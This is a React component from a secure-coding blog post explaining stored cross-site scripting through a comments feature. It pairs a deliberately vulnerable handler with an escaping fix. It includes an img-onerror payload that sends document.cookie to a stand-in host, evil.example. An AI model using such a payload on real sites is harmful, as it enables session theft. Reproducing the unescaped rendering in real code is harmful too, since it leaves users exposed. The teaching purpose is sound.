import { CodeBlock } from "@/components/blog/interactive/code-block";

export function StoredXSSSection() {
  return (
    <section>
      <h2 id="stored-xss" className="text-xl font-semibold text-brand-text mt-12 mb-4 scroll-mt-24">
        Stored XSS: the payload comes from your database
      </h2>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        Same bug, worse blast radius. Instead of round-tripping through one URL, the payload gets
        saved, and then served back to whoever visits the page next. No phishing link required.
      </p>

      <div className="bg-white border border-brand-border rounded-xl p-4 mb-6 not-prose">
        <p className="text-[9px] uppercase tracking-wider text-brand-text-subtle mb-3">
          A comments feature
        </p>
        <CodeBlock
          variant="vulnerable"
          language="JavaScript"
          code={`app.post("/comments", (req, res) => {
  comments.push({ author: req.body.author, body: req.body.body });
  res.redirect("/post");
});

// rendered later, for every visitor to this page
html += \`<div class="comment">\${comment.body}</div>\`;`}
        />
      </div>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        A comment body of{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">
          {'<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">'}
        </code>{" "}
        doesn&apos;t even need a{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">{"<script>"}</code>{" "}
        tag. The browser tries to load an image from a source that doesn&apos;t exist, fails, and
        runs the{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">onerror</code>{" "}
        handler as JavaScript. It always fails, because{" "}
        <code className="font-mono text-[13px] bg-brand-surface px-1.5 py-0.5 rounded">x</code>{" "}
        was never a real image path to begin with.
      </p>

      <p className="text-[15px] leading-relaxed text-brand-text/90 mb-4">
        This version doesn&apos;t need to trick anyone into clicking anything. Every single
        visitor who loads the post runs it, including whichever moderator or admin opens the page
        to review it, and admin sessions are usually the more valuable target.
      </p>

      <div className="bg-white border border-brand-border rounded-xl p-4 mb-6 not-prose">
        <p className="text-[9px] uppercase tracking-wider text-brand-text-subtle mb-3">
          Fixed: escape at render time, not at save time
        </p>
        <CodeBlock
          variant="fixed"
          language="JavaScript"
          code={`function escapeHtml(str) {
  return str.replace(/[&<>"']/g, (c) => ({
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;",
  }[c]));
}

html += \`<div class="comment">\${escapeHtml(comment.body)}</div>\`;`}
        />
      </div>

      <p className="text-[15px] leading-relaxed text-brand-text/90">
        Store the comment as plain text, exactly as the user typed it, and escape it wherever it
        eventually gets rendered. That&apos;s the more resilient order of operations. The same
        stored value might end up rendered into an HTML page, embedded in a JSON API response, or
        dropped into an email digest, and each of those contexts has different escaping rules.
        Trying to sanitize once at save time bakes in an assumption about where the data will land
        that won&apos;t always hold.
      </p>
    </section>
  );
}
